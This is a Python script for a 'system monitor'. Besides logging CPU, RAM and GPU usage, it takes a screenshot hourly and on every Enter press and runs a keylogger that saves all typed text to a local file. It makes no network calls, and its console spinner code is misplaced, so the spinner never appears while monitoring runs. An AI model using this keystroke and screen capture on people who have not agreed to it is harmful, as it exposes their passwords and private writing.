import os
import pyautogui
import time
import datetime
import keyboard
import logging
import threading
import psutil
import GPUtil

class SystemMonitor:
    """ 
    SystemMonitor is a class designed to monitor system performance, capture screenshots, and log keyboard inputs.
        __init__(log_dir="logs", text_file="typed_words.txt"):
            Initializes the system monitor, creates the log directory if it does not exist, and sets up the logging configuration.
        stop_monitoring():
            Stops the monitoring process by setting the `running` attribute to `False`, logs an informational message, and prints a notification to the console.
        take_screenshot():
            Takes a screenshot of the current screen and saves it to a file in the specified log directory with a timestamped filename.
        check_system_status():
            Checks the system status including CPU, RAM, and GPU usage, and logs the information using the `psutil` and `GPUtil` libraries.
        monitor_system():
            Monitors the system on an hourly basis by performing system status checks and taking screenshots every hour while the `running` attribute is True.
        start_monitoring():
            Starts monitoring for the 'enter' key press event, triggers the `take_screenshot` method when the 'enter' key is pressed, and sleeps for 1 second before continuing the loop.
        log_keys(duration=10, output_file="logs/output.txt"):
        start():
            Starts the system monitoring process, adds a hotkey to stop monitoring, and runs the monitoring, key logging, and screenshot capturing methods in separate threads.
    """

    def __init__(self, log_dir="logs", text_file="typed_words.txt"):
        """
        Initializes the system monitor.
        Args:
            log_dir (str): Directory where log files will be stored. Default is "logs".
            text_file (str): Name of the text file to store typed words. Default is "typed_words.txt".
        Attributes:
            log_dir (str): Directory where log files will be stored.
            text_file (str): Name of the text file to store typed words.
            running (bool): Flag to indicate if the system monitor is running.
            logger (logging.Logger): Logger instance for the system monitor.
        Creates the log directory if it does not exist and sets up the logging configuration.
        """
        self.log_dir = log_dir
        self.text_file = text_file
        self.running = True  

        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)

        today = datetime.date.today().strftime("%Y-%m-%d")
        log_file = os.path.join(self.log_dir, f"system_monitor_{today}.log")

        for handler in logging.root.handlers[:]:
            logging.root.removeHandler(handler)

        logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s - %(message)s",)
        self.logger = logging.getLogger("system_monitor")
        self.logger.propagate = False

    def stop_monitoring(self):
        """
        Stops the monitoring process.

        This method sets the `running` attribute to `False`, effectively stopping
        the monitoring loop. It also logs an informational message and prints a
        notification to the console indicating that monitoring has been stopped
        by the user.
        """
        self.running = False
        logging.info("Monitoring stopped by user.")
        print("\n[!] Monitoring stopped.")

    def take_screenshot(self):
        """
        Takes a screenshot of the current screen and saves it to a file.

        The screenshot is saved in the directory specified by `self.log_dir` with a filename
        that includes a timestamp in the format "YYYY-MM-DD_HH-MM-SS".

        Returns:
            None
        """
        screenshot = pyautogui.screenshot()
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_file = os.path.join(self.log_dir, f"screenshot_{timestamp}.png")
        screenshot.save(screenshot_file)
        logging.info(f"Screenshot taken and saved at {screenshot_file}")

    def check_system_status(self):
        """
        Checks the system status including CPU, RAM, and GPU usage, and logs the information.
        This method performs the following actions:
        - Retrieves the CPU usage percentage and logs it.
        - Retrieves the total, used, and free RAM, as well as the memory usage percentage, and logs them.
        - Retrieves information about available GPUs, including their name, memory usage, and temperature, and logs them.
        Note:
        - This method uses the `psutil` library to get CPU and RAM information.
        - This method uses the `GPUtil` library to get GPU information.
        - The log entries are written using the `logging` module.
        """
        cpu_percent = psutil.cpu_percent(interval=1)  
        logging.info(f"---> CPU usage: {cpu_percent}%")
        logging.info("--------------------")

        memory = psutil.virtual_memory()
        logging.info(f"---> Total RAM: {memory.total / (1024 ** 3):.2f} GB")
        logging.info(f"---> Used RAM: {memory.used / (1024 ** 3):.2f} GB")
        logging.info(f"---> Free RAM: {memory.free / (1024 ** 3):.2f} GB")
        logging.info(f"---> Memory usage: {memory.percent}%")
        logging.info("--------------------")

        gpus = GPUtil.getGPUs()
        for gpu in gpus:
            logging.info(f"---> GPU: {gpu.name}")
            logging.info(f"---> GPU Memory Total: {gpu.memoryTotal} MB")
            logging.info(f"---> GPU Memory Used: {gpu.memoryUsed} MB")
            logging.info(f"---> GPU Memory Free: {gpu.memoryFree} MB")
            logging.info(f"---> GPU Memory Usage: {gpu.memoryUtil * 100}%")
            logging.info(f"---> GPU Temperature: {gpu.temperature} °C")
        logging.info("--------------------")

    def monitor_system(self):
        """
        Monitors the system on an hourly basis.

        This method runs in a loop while the `running` attribute is True. It performs
        system status checks and takes screenshots every hour.

        Methods:
            check_system_status(): Checks the current status of the system.
            take_screenshot(): Captures a screenshot of the current screen.

        Note:
            The loop sleeps for 3600 seconds (1 hour) between each iteration.
        """
        while self.running:
            self.check_system_status()
            self.take_screenshot()
            time.sleep(3600)  

    def start_monitoring(self):
        """
        Starts monitoring for the 'enter' key press event.
        This method runs in a loop while the `running` attribute is True. When the 'enter' key is pressed,
        it triggers the `take_screenshot` method and then sleeps for 1 second before continuing the loop.
        """
        
        while self.running:
            if keyboard.is_pressed('enter'):
                self.take_screenshot()
                time.sleep(1)  

    def log_keys(self, duration=10, output_file="logs/output.txt"):
        """
        Records keyboard input for a specified duration and saves the typed text to an output file.
        Args:
            duration (int, optional): The duration in seconds to record keyboard input. Defaults to 10.
            output_file (str, optional): The file path where the recorded text will be saved. Defaults to "logs/output.txt".
        Returns:
            None
        """
        typed_text = []
        while True:
            keyboard.start_recording()  
            time.sleep(duration)
            recorded = keyboard.stop_recording()
            for event in recorded:
                if event.event_type == "down":
                    key = event.name
                    if key == "space":
                        typed_text.append(" ")
                    elif key == "enter":
                        typed_text.append("\n")
                    elif key == "backspace" and typed_text:
                        typed_text.pop()
                    elif len(key) == 1:
                        typed_text.append(key)

                with open(output_file, "w", encoding="utf-8") as f:
                    f.write("".join(typed_text))
            print(f"Text saved to {output_file}")

    def start(self):
        """
        Starts the system monitoring by initializing threads for different monitoring tasks
        and setting up a hotkey to stop the monitoring.
        This method performs the following actions:
        - Adds a hotkey (Alt + Ctrl + End) to stop the monitoring.
        - Starts a daemon thread for system monitoring.
        - Starts a daemon thread for additional monitoring tasks.
        - Starts a daemon thread for logging keystrokes.
        - Logs the start of system monitoring.
        - Prints a message indicating that system monitoring has started.
        The method keeps the main thread alive while the monitoring is running.
        Note:
            The method assumes that `self.running` is a boolean attribute that controls
            the running state of the monitoring process.
        """
        keyboard.add_hotkey("alt+ctrl+end", self.stop_monitoring)  

        threading.Thread(target=self.monitor_system, daemon=True).start()
        threading.Thread(target=self.start_monitoring, daemon=True).start()
        threading.Thread(target=self.log_keys, daemon=True).start()

        logging.info("System monitoring started.")
        print("[+] System monitoring started. Press 'Alt + Ctrl + End' to stop.")

        while self.running:
            time.sleep(1)

if __name__ == "__main__":
    monitor = SystemMonitor()
    monitor.start()

    os.system('cls' if os.name == 'nt' else 'clear')
    text_start = "the tool is running "
    
    while monitor.running:
        for i in range(len(text_start)):
            os.system('cls' if os.name == 'nt' else 'clear')
            txt = text_start[i]
            spilt_one = text_start[:i]
            spilt_two = text_start[i+1:]

            if txt == " " or txt == ".":
                continue
            print(f'{spilt_one}{txt.upper()}{spilt_two}\\')
            time.sleep(0.15)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'{spilt_one}{txt.lower()}{spilt_two}|')
            time.sleep(0.15)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'{spilt_one}{txt.lower()}{spilt_two}/')
            time.sleep(0.15)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'{spilt_one}{txt}{spilt_two}--')
            time.sleep(0.10)
